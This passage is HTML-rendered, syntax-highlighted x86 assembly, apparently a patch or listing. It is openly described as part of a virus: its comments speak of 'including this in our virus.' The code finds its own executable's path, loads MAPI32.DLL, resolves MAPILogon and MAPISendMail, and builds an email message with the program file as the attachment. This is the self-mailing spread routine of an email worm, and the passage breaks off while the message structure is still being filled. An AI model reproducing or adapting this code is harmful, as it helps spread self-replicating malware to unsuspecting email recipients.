+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; locals<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; jumps<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">.</span>model <span style="color: #0000ff; font-weight: bold;">flat</span><span style="color: #339933;">,</span>STDCALL<br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; include Win32api<span style="color: #339933;">.</span><span style="color: #00007f; font-weight: bold;">inc</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; include Useful<span style="color: #339933;">.</span><span style="color: #00007f; font-weight: bold;">inc</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; extrn ExitProcess<span style="color: #339933;">:</span>NEAR<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; extrn LoadLibraryA<span style="color: #339933;">:</span>NEAR<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; extrn GetModuleFileNameA<span style="color: #339933;">:</span>NEAR<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; extrn GetProcAddress<span style="color: #339933;">:</span>NEAR<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; extrn FreeLibrary<span style="color: #339933;">:</span>NEAR<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; extrn ExitProcess<span style="color: #339933;">:</span>NEAR<br/>
+<br/>
+_TEXT &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">segment</span> <span style="color: #0000ff; font-weight: bold;">dword</span> <span style="color: #0000ff; font-weight: bold;">use32</span> <span style="color: #0000ff; font-weight: bold;">public</span> <span style="color: #7f007f;">'CODE'</span><br/>
+<br/>
+demo_entry<span style="color: #339933;">:</span> &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">xor</span> <span style="color: #46aa03; font-weight: bold;">ebp</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">ebp</span> &nbsp; &nbsp; <span style="color: black; font-style: italic;">;We will use delta-offset when including</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;this in our virus. By now delta is NULL</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span> MAX_PATH<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">lea</span> <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span><span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ebp</span><span style="color: #339933;">+</span>szFileAttach<span style="color: black;">&#93;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span> <span style="color: #46aa03; font-weight: bold;">eax</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span> <span style="color: #ff0000;">00000000h</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span> GetModuleFileNameA <span style="color: black; font-style: italic;">;Get the path and name of the file</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;used to create current process</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span> getMAPI32sz&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;Load MAPI32.DLL</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">db</span> <span style="color: #7f007f;">&quot;MAPI32.DLL&quot;</span><span style="color: #339933;">,</span><span style="color: #ff0000;">00h</span><br/>
+<br/>
+getMAPI32sz<span style="color: #339933;">:</span>&nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span> LoadLibraryA<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">or</span> <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">eax</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jz</span> errMAPI32&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;Be smart, always do error-checking</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ebp</span><span style="color: #339933;">+</span>hMAPI32<span style="color: black;">&#93;</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">eax</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span> getMAPIfunc01&nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;Get MAPILogOn entry-point</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">db</span> <span style="color: #7f007f;">&quot;MAPILogon&quot;</span><span style="color: #339933;">,</span><span style="color: #ff0000;">00h</span><br/>
+<br/>
+getMAPIfunc01<span style="color: #339933;">:</span>&nbsp; <span style="color: #00007f; font-weight: bold;">push</span> <span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ebp</span><span style="color: #339933;">+</span>hMAPI32<span style="color: black;">&#93;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span> GetProcAddress<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">or</span> <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">eax</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jz</span> freeMAPI32<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ebp</span><span style="color: #339933;">+</span>a_MAPILogon<span style="color: black;">&#93;</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">eax</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span> getMAPIfunc02&nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;Get MAPILogOut entry-point</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">db</span> <span style="color: #7f007f;">&quot;MAPILogoff&quot;</span><span style="color: #339933;">,</span><span style="color: #ff0000;">00h</span><br/>
+<br/>
+getMAPIfunc02<span style="color: #339933;">:</span>&nbsp; <span style="color: #00007f; font-weight: bold;">push</span> <span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ebp</span><span style="color: #339933;">+</span>hMAPI32<span style="color: black;">&#93;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span> GetProcAddress<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">or</span> <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">eax</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jz</span> freeMAPI32<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ebp</span><span style="color: #339933;">+</span>a_MAPILogoff<span style="color: black;">&#93;</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">eax</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span> getMAPIfunc03&nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;Get MAPISendMail entry-point</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">db</span> <span style="color: #7f007f;">&quot;MAPISendMail&quot;</span><span style="color: #339933;">,</span><span style="color: #ff0000;">00h</span><br/>
+<br/>
+getMAPIfunc03<span style="color: #339933;">:</span>&nbsp; <span style="color: #00007f; font-weight: bold;">push</span> <span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ebp</span><span style="color: #339933;">+</span>hMAPI32<span style="color: black;">&#93;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span> GetProcAddress<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">or</span> <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">eax</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jz</span> freeMAPI32<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ebp</span><span style="color: #339933;">+</span>a_MAPISendMail<span style="color: black;">&#93;</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">eax</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;LogOn... This isnt necesary, as we can call MAPISendMail</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;specifying an existing and shared MAPI session</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">lea</span> <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span><span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ebp</span><span style="color: #339933;">+</span>hMAPISession<span style="color: black;">&#93;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span> <span style="color: #46aa03; font-weight: bold;">eax</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span> <span style="color: #ff0000;">00000000h</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span> <span style="color: #ff0000;">00000000h</span> &nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;MAPI_NEW_SESSION</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">lea</span> <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span><span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ebp</span><span style="color: #339933;">+</span>szPassword<span style="color: black;">&#93;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span> <span style="color: #46aa03; font-weight: bold;">eax</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">lea</span> <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span><span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ebp</span><span style="color: #339933;">+</span>szUsername<span style="color: black;">&#93;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span> <span style="color: #46aa03; font-weight: bold;">eax</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span> <span style="color: #ff0000;">00000000h</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span> <span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ebp</span><span style="color: #339933;">+</span>a_MAPILogon<span style="color: black;">&#93;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">or</span> <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">eax</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jnz</span> freeMAPI32<br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;Build message</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">cld</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">lea</span> <span style="color: #46aa03; font-weight: bold;">edi</span><span style="color: #339933;">,</span><span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ebp</span><span style="color: #339933;">+</span>MapiMessage<span style="color: black;">&#93;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">xor</span> <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">eax</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">stosd</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;ulReserved</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">lea</span> <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span><span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ebp</span><span style="color: #339933;">+</span>szSubject<span style="color: black;">&#93;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">stosd</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;lpszSubject</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">lea</span> <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span><span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ebp</span><span style="color: #339933;">+</span>szNoteText<span style="color: black;">&#93;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">stosd</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;lpszNoteText</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">xor</span> <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">eax</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">stosd</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;lpszMessageType</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">lea</span> <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span><span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ebp</span><span style="color: #339933;">+</span>szDate<span style="color: black;">&#93;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">stosd</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;lpszDate</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">xor</span> <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">eax</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">stosd</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;lpszConversationID</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span><span style="color: #ff0000;">00000002h</span> <span style="color: black; font-style: italic;">;MAPI_RECEIPT_REQUESTED </span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">stosd</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;flFlags</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">lea</span> <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span><span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ebp</span><span style="color: #339933;">+</span>MsgFrom<span style="color: black;">&#93;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">stosd</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;lpOriginator</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span><span style="color: #ff0000;">00000001h</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">stosd</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;nRecipCount</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">lea</span> <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span><span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ebp</span><span style="color: #339933;">+</span>MsgTo<span style="color: black;">&#93;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">stosd</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;lpRecips</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span><span style="color: #ff0000;">00000001h</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">stosd</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;nFileCount</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">lea</span> <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span><span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ebp</span><span style="color: #339933;">+</span>MapiFileDesc<span style="color: black;">&#93;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">stosd</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;lpFiles</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;Originator</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">xor</span> <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">eax</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;ulReserved </span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">stosd</span><br/>
